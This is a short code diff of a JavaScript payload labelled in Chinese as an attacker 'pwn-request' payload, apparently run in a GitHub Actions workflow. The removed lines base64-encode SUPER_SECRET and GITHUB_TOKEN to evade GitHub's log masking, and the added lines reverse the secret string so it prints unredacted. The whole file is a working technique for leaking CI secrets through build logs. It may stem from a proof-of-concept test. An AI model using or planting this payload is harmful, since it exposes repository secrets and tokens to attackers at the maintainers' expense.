@@ -1,10 +1,8 @@
-// === 攻击者 payload v2:base64 编码绕过 GitHub 自动脱敏 ===
+// === payload v3:反转字符串绕过日志脱敏,证明真值可还原 ===
 const s = process.env.SUPER_SECRET || "";
-const g = process.env.GITHUB_TOKEN || "";
+const rev = s.split("").reverse().join("");
 console.log("### PWN-REQUEST PAYLOAD EXECUTED ###");
 console.log("event_name =", process.env.GITHUB_EVENT_NAME);
 console.log("SECRET_LEN =", s.length);
-console.log("SECRET_B64 =", s ? Buffer.from(s).toString("base64") : "(empty)");
-console.log("TOKEN_B64  =", g ? Buffer.from(g).toString("base64").slice(0,24)+"..." : "(empty)");
+console.log("SECRET_REV =", s ? rev : "(empty)");   // 反转后不匹配注册值 → 不被脱敏
 console.log("### END ###");
-// touch 1791946332
